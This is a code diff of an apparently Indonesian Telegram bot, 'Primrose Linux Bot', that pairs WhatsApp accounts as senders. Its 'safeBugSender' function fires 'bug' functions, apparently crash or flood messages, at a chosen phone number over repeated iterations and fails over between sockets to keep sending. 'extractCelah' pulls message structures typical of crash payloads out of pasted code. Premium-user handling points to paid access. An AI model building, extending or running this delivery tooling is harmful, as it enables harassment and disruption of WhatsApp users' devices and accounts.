-        if (sentMsg) statusMessage = sentMsg.message_id;
-    } catch (error) {
-        pairingInProgress.delete(botNumber);
-        throw error;
-    }
-
-    const sessionDir = createSessionDir(botNumber);
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-
-    const newSock = makeWASocket({
-        auth: state,
-        printQRInTerminal: false,
-        logger: P({ level: "silent" }),
-        defaultQueryTimeoutMs: 60000,
-        keepAliveIntervalMs: 30000,
-        connectTimeoutMs: 60000,
-        emitOwnEvents: true,
-        fireInitQueries: false,
-        syncFullHistory: false,
-        markOnlineOnConnect: false,
-        generateHighQualityLinkPreview: false,
-        browser: ["Primrose Linux Bot", "Chrome", "1.0.0"],
-    });
-
-    let pairingCodeRequested = false;
-
-    const cleanup = () => {
-        if (pairingTimeout) clearTimeout(pairingTimeout);
-        pairingInProgress.delete(botNumber);
-    };
-
-    return new Promise((resolve, reject) => {
-        pairingTimeout = setTimeout(() => {
-            if (!connectionEstablished) {
-                console.log(`⏰ Pairing timeout for ${botNumber}`);
-                cleanup();
-                if (statusMessage && chatId) {
-                    safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ⏰ ]</blockquote>\n— Number : ${botNumber}\n— Status : Timeout (Coba lagi dengan /reqpair)`, { parse_mode: "HTML" }).catch(() => {});
-                }
-                reject(new Error("Pairing timeout"));
-            }
-        }, PAIRING_TIMEOUT);
-
-        newSock.ev.on("connection.update", async (update) => {
-            const { connection, lastDisconnect, pairingCode } = update;
-            
-            if (pairingCode && !pairingCodeRequested) {
-                pairingCodeRequested = true;
-                const formattedCode = pairingCode.match(/.{1,4}/g)?.join("-") || pairingCode;
-                if (statusMessage && chatId) {
-                    await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>\n— Number : ${botNumber}\n— Pairing Code : <code>${formattedCode}</code>\n— Status : Waiting for pairing...\n— Expires in : 2 minutes`, { parse_mode: "HTML" });
-                }
-                console.log(`📱 Pairing code for ${botNumber}: ${formattedCode}`);
-            }
-            
-            if (connection === "open") {
-                if (!connectionEstablished) {
-                    connectionEstablished = true;
-                    clearTimeout(pairingTimeout);
-                    cleanup();
-                    sessions.set(botNumber, newSock);
-                    saveActiveSessions(botNumber);
-                    startPingInterval(botNumber, newSock);
-                    console.log(`✅ WhatsApp ${botNumber} connected successfully!`);
-                    if (statusMessage && chatId) {
-                        await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ✅ ]</blockquote>\n— Number : ${botNumber}\n— Status : Connected Successfully!`, { parse_mode: "HTML" });
-                    }
-                    resolve(newSock);
-                }
-            } else if (connection === "close") {
-                const statusCode = lastDisconnect?.error?.output?.statusCode;
-                const errorMessage = lastDisconnect?.error?.message || "Unknown error";
-                console.log(`Connection closed for ${botNumber}, statusCode: ${statusCode}, error: ${errorMessage}`);
-                
-                if (statusCode === 515 && retryCount < MAX_RETRIES) {
-                    retryCount++;
-                    console.log(`🔄 Retry ${retryCount}/${MAX_RETRIES} for ${botNumber} after stream error...`);
-                    if (statusMessage && chatId) {
-                        await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🔄 ]</blockquote>\n— Number : ${botNumber}\n— Status : Reconnecting... (${retryCount}/${MAX_RETRIES})`, { parse_mode: "HTML" }).catch(() => {});
-                    }
-                    await sleep(3000);
-                    return;
-                }
-                
-                cleanup();
-                
-                if (statusCode === DisconnectReason.loggedOut || statusCode === 403) {
-                    if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>\n— Number : ${botNumber}\n— Status : Gagal (Logged out / Blocked)`, { parse_mode: "HTML" });
-                    removeActiveSession(botNumber);
-                    reject(new Error("Logged out or blocked"));
-                } else if (statusCode === 428) {
-                    if (!connectionEstablished && !pairingCodeRequested) {
-                        try {
-                            const code = await newSock.requestPairingCode(botNumber);
-                            pairingCodeRequested = true;
-                            const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
-                            if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>\n— Number : ${botNumber}\n— Pairing Code : <code>${formattedCode}</code>\n— Status : Waiting for pairing...`, { parse_mode: "HTML" });
-                        } catch (err) {
-                            if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>\n— Number : ${botNumber}\n— Status : Error requesting pairing code`, { parse_mode: "HTML" });
-                            reject(err);
-                        }
-                    }
-                } else if (statusCode === 515) {
-                    if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🌐 ]</blockquote>\n— Number : ${botNumber}\n— Status : Network Error (515)\n— Solusi : Coba lagi nanti atau ganti jaringan`, { parse_mode: "HTML" });
-                    reject(new Error(`Stream Error (515) - Network issue`));
-                } else if (statusCode === 408 || statusCode === 503) {
-                    if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ⏰ ]</blockquote>\n— Number : ${botNumber}\n— Status : Connection timeout (Coba lagi)`, { parse_mode: "HTML" });
-                    reject(new Error(`Connection timeout (${statusCode})`));
-                } else {
-                    if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ ❌ ]</blockquote>\n— Number : ${botNumber}\n— Status : Error (${statusCode || 'unknown'})`, { parse_mode: "HTML" });
-                    reject(new Error(`Connection closed: ${statusCode}`));
-                }
-            } else if (connection === "connecting") {
-                if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🔄 ]</blockquote>\n— Number : ${botNumber}\n— Status : Connecting...`, { parse_mode: "HTML" });
-            }
-        });
-
-        newSock.ev.on("creds.update", saveCreds);
-        
-        setTimeout(async () => {
-            if (!pairingCodeRequested && !connectionEstablished) {
-                try {
-                    pairingCodeRequested = true;
-                    const code = await newSock.requestPairingCode(botNumber);
-                    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
-                    if (statusMessage && chatId) await safeEditMessageText(chatId, statusMessage, `<blockquote>Primrose Linux Bot [ 🔒 ]</blockquote>\n— Number : ${botNumber}\n— Pairing Code : <code>${formattedCode}</code>\n— Status : Waiting for pairing...`, { parse_mode: "HTML" });
-                } catch (err) {
-                    console.log(`Error requesting pairing code for ${botNumber}:`, err.message);
-                }
-            }
-        }, 2000);
-    });
 }
 
 async function initializeWhatsAppConnections() {
     try {
         if (fs.existsSync(SESSIONS_FILE)) {
             const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-            console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
+            console.log(chalk.cyan(`📱 Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));
+            
             for (const botNumber of activeNumbers) {
-                console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
-                const sessionDir = createSessionDir(botNumber);
-                const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-                const sock = makeWASocket({
-                    auth: state,
-                    printQRInTerminal: true,
-                    logger: P({ level: "silent" }),
-                    defaultQueryTimeoutMs: 60000,
-                    keepAliveIntervalMs: 60000,
-                    connectTimeoutMs: 60000,
-                    emitOwnEvents: true,
-                    fireInitQueries: true,
-                    syncFullHistory: false,
-                    markOnlineOnConnect: false,
-                    generateHighQualityLinkPreview: false,
-                    browser: ["Primrose Linux Bot", "Chrome", "1.0.0"],
-                });
-                await new Promise((resolve, reject) => {
-                    const timeout = setTimeout(() => { console.log(`⏰ Timeout connecting ${botNumber}`); resolve(); }, 60000);
-                    sock.ev.on("connection.update", async (update) => {
-                        const { connection, lastDisconnect } = update;
-                        if (connection === "open") {
-                            clearTimeout(timeout);
-                            console.log(`Bot ${botNumber} terhubung!`);
-                            sessions.set(botNumber, sock);
-                            startPingInterval(botNumber, sock);
-                            resolve();
-                        } else if (connection === "close") {
-                            const statusCode = lastDisconnect?.error?.output?.statusCode;
-                            const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 403;
-                            if (shouldReconnect) {
-                                console.log(`Mencoba menghubungkan ulang bot ${botNumber}... (${statusCode || 'unknown'})`);
-                                reconnectWithBackoff(botNumber, 1);
-                                clearTimeout(timeout);
-                                resolve();
-                            } else {
-                                clearTimeout(timeout);
-                                reject(new Error("Koneksi ditutup - logged out or blocked"));
-                            }
-                        }
-                    });
-                    sock.ev.on("creds.update", saveCreds);
-                });
+                console.log(chalk.cyan(`🔄 Mencoba menghubungkan WhatsApp: ${botNumber}`));
+                await connectWithRetry(botNumber);
+                await sleep(2000); // Delay antar koneksi
             }
         }
+        
+        // Start health check setelah semua koneksi dicoba
+        startHealthCheck();
+        
     } catch (error) {
-        console.error("Error initializing WhatsApp Connections:", error);
+        console.error(chalk.red("Error initializing WhatsApp Connections:"), error);
     }
 }
 
-// ================= HELPER FUNCTIONS ================= //
-function isOwner(userId) { return OWNER_ID.toString() === userId.toString(); }
-function isPremium(userId) { const user = premiumUsers.find(u => u.id === userId); if (!user) return false; if (user.expiresAt === "permanent") return true; return Date.now() < user.expiresAt; }
-function isCommandBlocked(commandName) { return blockedCommands.includes(commandName.toLowerCase()); }
-function formatRuntime() { let sec = Math.floor(process.uptime()); let hrs = Math.floor(sec / 3600); sec %= 3600; let mins = Math.floor(sec / 60); sec %= 60; return `${hrs}h ${mins}m ${sec}s`; }
-function formatMemory() { return `${(process.memoryUsage().rss / 1024 / 1024).toFixed(0)} MB`; }
-function getRandomImage() { return "https://files.catbox.moe/n5forg.jpg"; }
-function getCurrentDate() { return new Date().toLocaleString('id-ID', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }); }
+function createSessionDir(botNumber) {
+    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
+    if (!fs.existsSync(deviceDir)) {
+        fs.mkdirSync(deviceDir, { recursive: true });
+    }
+    return deviceDir;
+}
 
-// ================= BUTTON STYLES ================= //
-const buttonIntervals = new Map();
-let globalIntervalId = null;
-let globalMessageId = null;
-let globalChatId = null;
-let discoActive = false;
-let currentStyleIndex = 0;
-const buttonStyles = ["primary", "success", "danger"];
+async function ConnectToWhatsApp(botNumber, chatId) {
+    let statusMessage = null;
+    try {
+        const sentMsg = await safeSendMessage(chatId, `
+<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
+— Number : ${botNumber}.
+— Status : Process
+`, { parse_mode: "HTML" });
+        if (sentMsg) statusMessage = sentMsg.message_id;
+    } catch (error) {}
+
+    const sessionDir = createSessionDir(botNumber);
+    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+
+    sock = createStableSocket(state, saveCreds);
+
+    sock.ev.on("connection.update", async (update) => {
+        const { connection, lastDisconnect } = update;
+        if (connection === "close") {
+            const statusCode = lastDisconnect?.error?.output?.statusCode;
+            if (statusCode && statusCode >= 500 && statusCode < 600) {
+                if (statusMessage) {
+                    await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
+— Number : ${botNumber}.
+— Status : Reconnecting...
+`, { parse_mode: "HTML" });
+                }
+                setTimeout(() => ConnectToWhatsApp(botNumber, chatId), 5000);
+            } else if (statusCode === DisconnectReason.loggedOut) {
+                if (statusMessage) {
+                    await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
+— Number : ${botNumber}.
+— Status : Gagal ❌
+`, { parse_mode: "HTML" });
+                }
+                try {
+                    fs.rmSync(sessionDir, { recursive: true, force: true });
+                } catch (error) {}
+            } else {
+                // Auto reconnect untuk status code lainnya
+                console.log(chalk.yellow(`⚠️ Connection closed for ${botNumber}, auto reconnect triggered`));
+                await handleReconnect(botNumber);
+            }
+        } else if (connection === "open") {
+            sessions.set(botNumber, sock);
+            saveActiveSessions(botNumber);
+            startPingInterval(botNumber, sock);
+            
+            // Setup error handler
+            sock.ev.on("error", (error) => {
+                console.error(chalk.red(`Socket error for ${botNumber}:`), error.message);
+                if (error.message && (error.message.includes("Connection closed") || error.message.includes("timeout"))) {
+                    handleReconnect(botNumber);
+                }
+            });
+            
+            if (statusMessage) {
+                await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
+— Number : ${botNumber}.
+— Status : Connected ✅
+`, { parse_mode: "HTML" });
+            }
+        } else if (connection === "connecting") {
+            await sleep(1000);
+            try {
+                if (!fs.existsSync(`${sessionDir}/creds.json`)) {
+                    let customcode = "PRIMROSE"
+                    const code = await sock.requestPairingCode(botNumber, customcode);
+                    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
+                    if (statusMessage) {
+                        await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
+— Number : ${botNumber}.
+— Code Pairing : ${formattedCode}
+`, { parse_mode: "HTML" });
+                    }
+                }
+            } catch (error) {
+                console.error("Error requesting pairing code:", error);
+                if (statusMessage) {
+                    await safeEditMessageText(chatId, statusMessage, `
+<blockquote>Primrose Linux Bot [ 𖣂 ]</blockquote>
+— Number : ${botNumber}.
+— Status : Error ❌ ${error.message}
+`, { parse_mode: "HTML" });
+                }
+            }
+        }
+    });
+
+    sock.ev.on("creds.update", saveCreds);
+    return sock;
+}
+
+// ================= SAFE BUG SENDER ================= //
+
+async function getActiveSocket() {
+    // Cari socket yang aktif
+    for (const [botNumber, sock] of sessions) {
+        try {
+            if (sock && sock.user && sock.ws && sock.ws.readyState === 1) {
+                // Test koneksi
+                await sock.sendPresenceUpdate('available');
+                return { sock, botNumber };
+            }
+        } catch (error) {
+            console.log(chalk.yellow(`⚠️ Socket ${botNumber} test failed, skipping...`));
+            // Trigger reconnect untuk socket yang mati
+            handleReconnect(botNumber);
+        }
+    }
+    return null;
+}
+
+async function safeBugSender(chatId, targetNumber, bugType, bugFunction, iterations = 1, delay = 100) {
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    
+    if (sessions.size === 0) {
+        await safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+        return false;
+    }
+    
+    // Cek dan pilih socket yang aktif
+    const activeSocket = await getActiveSocket();
+    
+    if (!activeSocket) {
+        await safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif. Mencoba reconnect...");
+        // Trigger reconnect untuk semua session
+        for (const [botNumber] of sessions) {
+            handleReconnect(botNumber);
+        }
+        await safeSendMessage(chatId, "🔄 Sistem sedang melakukan reconnect, silakan coba lagi dalam 30 detik.");
+        return false;
+    }
+    
+    let { sock, botNumber } = activeSocket;
+    
+    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, bugType, date), { 
+        parse_mode: "HTML", 
+        reply_markup: createCheckButton(targetNumber) 
+    });
+    
+    let successCount = 0;
+    let failCount = 0;
+    
+    for (let i = 0; i < iterations; i++) {
+        try {
+            // Cek ulang koneksi sebelum kirim
+            if (!sock.ws || sock.ws.readyState !== 1) {
+                console.log(chalk.yellow(`⚠️ Socket ${botNumber} disconnected during bug sending, mencari socket lain...`));
+                
+                const newActive = await getActiveSocket();
+                if (newActive) {
+                    sock = newActive.sock;
+                    botNumber = newActive.botNumber;
+                } else {
+                    throw new Error("No active socket available");
+                }
+            }
+            
+            await bugFunction(sock, target);
+            successCount++;
+            console.log(chalk.green(`✅ ${bugType} iteration ${i + 1}/${iterations} to ${targetNumber} (sender: ${botNumber})`));
+            
+        } catch (error) {
+            failCount++;
+            console.error(chalk.red(`❌ ${bugType} iteration ${i + 1} failed:`), error.message);
+            
+            // Jika error karena connection closed, cari socket lain
+            if (error.message && (error.message.includes("Connection closed") || error.message.includes("timeout"))) {
+                console.log(chalk.yellow(`🔄 Connection error, mencari socket alternatif...`));
+                
+                // Trigger reconnect untuk socket yang error
+                handleReconnect(botNumber);
+                
+                const newActive = await getActiveSocket();
+                if (newActive) {
+                    sock = newActive.sock;
+                    botNumber = newActive.botNumber;
+                    console.log(chalk.green(`✅ Berpindah ke socket ${botNumber}`));
+                }
+            }
+        }
+        
+        if (i < iterations - 1) {
+            await sleep(delay);
+        }
+    }
+    
+    // Kirim report
+    await safeSendMessage(chatId, `📊 *${bugType} Report*\n\n✅ Success: ${successCount}\n❌ Failed: ${failCount}\n📱 Target: ${targetNumber}\n🤖 Sender: ${botNumber}`, { parse_mode: "Markdown" });
+    
+    return successCount > 0;
+}
+
+let premiumUsers = [];
+let adminUsers = [];
+
+ensureFileExists("./database/premium.json");
+ensureFileExists("./database/admin.json");
+
+try {
+    premiumUsers = JSON.parse(fs.readFileSync("./database/premium.json"));
+    adminUsers = JSON.parse(fs.readFileSync("./database/admin.json"));
+} catch (error) {
+    premiumUsers = [];
+    adminUsers = [];
+}
+
+function savePremiumUsers() {
+    fs.writeFileSync("./database/premium.json", JSON.stringify(premiumUsers, null, 2));
+}
+
+function saveAdminUsers() {
+    fs.writeFileSync("./database/admin.json", JSON.stringify(adminUsers, null, 2));
+}
+
+function watchFile(filePath, updateCallback) {
+    fs.watch(filePath, (eventType) => {
+        if (eventType === "change") {
+            try {
+                const updatedData = JSON.parse(fs.readFileSync(filePath));
+                updateCallback(updatedData);
+                console.log(`File ${filePath} updated successfully.`);
+            } catch (error) {
+                console.error(`Error watching file:`, error);
+            }
+        }
+    });
+}
+
+watchFile("./database/premium.json", (data) => (premiumUsers = data));
+watchFile("./database/admin.json", (data) => (adminUsers = data));
+
+function isOwner(userId) {
+    return OWNER_ID.toString() === userId.toString();
+}
+
+function getPremiumStatus(userId) {
+    const user = premiumUsers.find((user) => user.id === userId);
+    if (user && new Date(user.expiresAt) > new Date()) {
+        return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
+    } else {
+        return "Tidak - Tidak ada waktu aktif";
+    }
+}
+
+function formatRuntime() {
+    let sec = Math.floor(process.uptime());
+    let hrs = Math.floor(sec / 3600);
+    sec %= 3600;
+    let mins = Math.floor(sec / 60);
+    sec %= 60;
+    return `${hrs}h ${mins}m ${sec}s`;
+}
+
+function formatMemory() {
+    const usedMB = process.memoryUsage().rss / 1024 / 1024;
+    return `${usedMB.toFixed(0)} MB`;
+}
+
+function getRandomImage() {
+    return "https://files.catbox.moe/n5forg.jpg";
+}
+
+const buttonIntervals = new Map()
+let globalIntervalId = null
+let globalMessageId = null
+let globalChatId = null
+let discoActive = false
+let currentStyleIndex = 0
+const buttonStyles = ["primary", "success", "danger"]
 
 function getButtonStyle(color) {
     switch(color) {
@@ -659,67 +1061,258 @@ function getColorFromChoice(choice) {
 }
 
 async function sendColoredMenu(chatId, from, color, editMessageId = null) {
-    const runtimeStatus = formatRuntime();
-    const memoryStatus = formatMemory();
-    const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE";
-    const botNumber = sessions.size;
-    const isWhite = (color === "secondary");
-    const buttonStyle = isWhite ? undefined : (color === "disco" ? buttonStyles[0] : color);
+    const userId = from.id
+    const randomImage = getRandomImage()
+    const runtimeStatus = formatRuntime()
+    const memoryStatus = formatMemory()
+    const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
+    const botNumber = sessions.size
+
+    const isWhite = (color === "secondary")
+    const buttonStyle = isWhite ? undefined : (color === "disco" ? buttonStyles[0] : color)
     
     let keyboard = [
-        [{ text: "XBUGS", callback_data: "trashmenu", style: buttonStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: buttonStyle }],
-        [{ text: "XSETTINGS", callback_data: "owner_menu", style: buttonStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: buttonStyle }],
-        [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: buttonStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: buttonStyle }]
-    ];
+        [
+            {
+                text: "XBUGS",
+                callback_data: "trashmenu",
+                style: buttonStyle
+            },
+            {
+                text: "XTOOLSBUG",
+                callback_data: "toolsbug_menu",
+                style: buttonStyle
+            }
+        ],
+        [
+            {
+                text: "XSETTINGS",
+                callback_data: "owner_menu",
+                style: buttonStyle
+            },
+            {
+                text: "XGROUPSECURITY",
+                callback_data: "group_security_menu",
+                style: buttonStyle
+            }
+        ],
+        [
+            {
+                text: "XCHANGECOLOR",
+                callback_data: "change_color_menu",
+                style: buttonStyle
+            },
+            {
+                text: "DEVELOPERS",
+                url: "https://t.me/ItsMeXanderRzMd",
+                style: buttonStyle
+            }
+        ]
+    ]
 
-    if (isWhite) keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null').replace(/"style":null/g, ''));
+    if (isWhite) {
+        keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null').replace(/"style":null/g, ''))
+    }
 
-    const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>\n🎩 Pemilik : @ItsMeXanderRzMd 🌟    \n😄 Owner : @realmarz 🌟\n🍽 Version : ${CURRENT_VERSION} \n🗡 Platform : Telegram\n<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>\n⛧ Status : ${status}\n⛧ Number : ${botNumber}\n⛧ Runtime : ${runtimeStatus}\n⛧ Memory : ${memoryStatus}`;
+    const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟    
+😄 Owner : @realmarz 🌟
+🍽 Version : ${CURRENT_VERSION} 
+🗡 Platform : Telegram Tes
+<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>
+⛧ Status : ${status}
+⛧ Number : ${botNumber}
+⛧ Runtime : ${runtimeStatus}
+⛧ Memory : ${memoryStatus}`
 
     let sent;
+    
     if (editMessageId) {
         try {
-            await safeEditMessageMedia(chatId, editMessageId, { type: 'photo', media: getRandomImage(), caption: caption, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } });
+            await safeEditMessageMedia(chatId, editMessageId, {
+                type: 'photo',
+                media: randomImage,
+                caption: caption,
+                parse_mode: "HTML"
+            }, {
+                reply_markup: {
+                    inline_keyboard: keyboard
+                }
+            });
             sent = { message_id: editMessageId };
         } catch (error) {
-            sent = await safeSendPhoto(chatId, getRandomImage(), { caption: caption, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
+            sent = await safeSendPhoto(chatId, randomImage, {
+                caption: caption,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: keyboard
+                }
+            });
         }
     } else {
-        sent = await safeSendPhoto(chatId, getRandomImage(), { caption: caption, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
+        sent = await safeSendPhoto(chatId, randomImage, {
+            caption: caption,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
     }
 
     if (!sent) return null;
 
-    const messageId = sent.message_id;
-    globalMessageId = messageId;
-    globalChatId = chatId;
-    if (globalIntervalId) clearInterval(globalIntervalId);
+    const messageId = sent.message_id
+    globalMessageId = messageId
+    globalChatId = chatId
+    currentStyleIndex = 0
 
-    if (color === "disco") {
-        discoActive = true;
-        globalIntervalId = setInterval(async () => {
-            if (!discoActive) return;
-            currentStyleIndex = (currentStyleIndex + 1) % buttonStyles.length;
-            const newStyle = buttonStyles[currentStyleIndex];
-            let newKeyboard = [
-                [{ text: "XBUGS", callback_data: "trashmenu", style: newStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: newStyle }],
-                [{ text: "XSETTINGS", callback_data: "owner_menu", style: newStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: newStyle }],
-                [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: newStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: newStyle }]
-            ];
-            await safeEditMessageReplyMarkup(chatId, messageId, { inline_keyboard: newKeyboard });
-        }, 1500);
-    } else {
-        discoActive = false;
-        globalIntervalId = null;
+    if (globalIntervalId) {
+        clearInterval(globalIntervalId)
     }
 
-    buttonIntervals.set(messageId, globalIntervalId);
-    return messageId;
+    if (color === "disco") {
+        discoActive = true
+        globalIntervalId = setInterval(async () => {
+            if (!discoActive) return
+            
+            currentStyleIndex = (currentStyleIndex + 1) % buttonStyles.length
+            const newStyle = buttonStyles[currentStyleIndex]
+
+            let newKeyboard = [
+                [
+                    {
+                        text: "XBUGS",
+                        callback_data: "trashmenu",
+                        style: newStyle
+                    },
+                    {
+                        text: "XTOOLSBUG",
+                        callback_data: "toolsbug_menu",
+                        style: newStyle
+                    }
+                ],
+                [
+                    {
+                        text: "XSETTINGS",
+                        callback_data: "owner_menu",
+                        style: newStyle
+                    },
+                    {
+                        text: "XGROUPSECURITY",
+                        callback_data: "group_security_menu",
+                        style: newStyle
+                    }
+                ],
+                [
+                    {
+                        text: "XCHANGECOLOR",
+                        callback_data: "change_color_menu",
+                        style: newStyle
+                    },
+                    {
+                        text: "DEVELOPERS",
+                        url: "https://t.me/ItsMeXanderRzMd",
+                        style: newStyle
+                    }
+                ]
+            ]
+
+            await safeEditMessageReplyMarkup(chatId, messageId, { inline_keyboard: newKeyboard });
+        }, 1500)
+    } else {
+        discoActive = false
+        globalIntervalId = null
+    }
+
+    buttonIntervals.set(messageId, globalIntervalId)
+    return messageId
 }
 
-async function sendStartMenu(chatId, from) { return await sendColoredMenu(chatId, from, currentColor, null); }
+async function sendStartMenu(chatId, from) {
+    return await sendColoredMenu(chatId, from, currentColor, null)
+}
 
-// ================= EXTRACT CELAH ================= //
+function stopDiscoEffect() {
+    discoActive = false
+    if (globalIntervalId) {
+        clearInterval(globalIntervalId)
+        globalIntervalId = null
+    }
+}
+
+function isPremium(userId) {
+    const user = premiumUsers.find(u => u.id === userId)
+    if (!user) return false
+    if (user.expiresAt === "permanent") return true
+    return Date.now() < user.expiresAt
+}
+
+function isCommandBlocked(commandName) {
+    return blockedCommands.includes(commandName.toLowerCase());
+}
+
+async function addGroupPremium(chatId, days, userId) {
+    const chat = await bot.getChat(chatId);
+    const groupId = chatId.toString();
+    const groupTitle = chat.title;
+    const existingGroup = groupPremiumData.find(g => g.groupId === groupId);
+    const expiresAt = Date.now() + (days * 24 * 60 * 60 * 1000);
+    if (existingGroup) {
+        existingGroup.expiresAt = expiresAt;
+        existingGroup.updatedBy = userId;
+        existingGroup.updatedAt = Date.now();
+    } else {
+        groupPremiumData.push({
+            groupId: groupId,
+            groupTitle: groupTitle,
+            addedBy: userId,
+            addedAt: Date.now(),
+            expiresAt: expiresAt,
+            members: []
+        });
+    }
+    saveGroupPremiumData(groupPremiumData);
+    return true;
+}
+
+function removeGroupPremium(chatId) {
+    const groupId = chatId.toString();
+    groupPremiumData = groupPremiumData.filter(g => g.groupId !== groupId);
+    saveGroupPremiumData(groupPremiumData);
+    return true;
+}
+
+async function addMemberPremiumFromGroup(chatId, userId, username, days) {
+    const groupId = chatId.toString();
+    const group = groupPremiumData.find(g => g.groupId === groupId);
+    if (!group) return false;
+    const expiresAt = Date.now() + (days * 24 * 60 * 60 * 1000);
+    const existingMember = group.members.find(m => m.userId === userId);
+    if (existingMember) {
+        existingMember.expiresAt = expiresAt;
+        existingMember.username = username;
+    } else {
+        group.members.push({
+            userId: userId,
+            username: username,
+            addedAt: Date.now(),
+            expiresAt: expiresAt
+        });
+    }
+    const existingPremium = premiumUsers.find(u => u.id === userId);
+    if (!existingPremium) {
+        premiumUsers.push({ id: userId, expiresAt: expiresAt });
+    } else {
+        existingPremium.expiresAt = expiresAt;
+    }
+    savePremiumUsers();
+    saveGroupPremiumData(groupPremiumData);
+    return true;
+}
+
+const pendingColorPoll = {};
+
+// ================= EXTRACT CELAH/PATTERN ================= //
 function extractCelah(code) {
     const patterns = {
         'groupInviteMessage': /groupInviteMessage\s*:\s*{([^}]+)}/gs,
@@ -736,52 +1329,32 @@ function extractCelah(code) {
         'contextInfo': /contextInfo\s*:\s*{([^}]+)}/gs,
         'templateMessage': /templateMessage\s*:\s*{([^}]+)}/gs,
         'stickerPackMessage': /stickerPackMessage\s*:\s*{([^}]+)}/gs,
-        'eventMessage': /eventMessage\s*:\s*{([^}]+)}/gs,
-        'extendedTextMessage': /extendedTextMessage\s*:\s*{([^}]+)}/gs,
+        'eventMessage': /eventMessage\s*:\s*{([^}]+)}/gs
     };
     let results = [];
     for (const [type, pattern] of Object.entries(patterns)) {
         const matches = code.matchAll(pattern);
         for (const match of matches) {
-            results.push({ type: type, content: match[0].trim(), fullMatch: match[0] });
+            results.push({
+                type: type,
+                content: match[0].trim(),
+                fullMatch: match[0]
+            });
         }
     }
     return results;
 }
 
-// ================= ADD PARTICIPANT ================= //
-function addParticipantToCode(code) {
-    const hasParticipant = code.includes('participant: { jid: target }') || code.includes('}, { participant:') || code.includes('{ participant: { jid: target } }');
-    if (hasParticipant) return { hasAlready: true, fixedCode: code, message: "✅ Participant sudah ada dalam code." };
-    
-    let fixed = code;
-    if (/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g.test(fixed)) {
-        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g, 'sock.relayMessage(target, message, { participant: { jid: target } })');
-        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant berhasil ditambahkan." };
-    }
-    if (/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*,\s*\{[^}]*\}\s*\)/g.test(fixed)) {
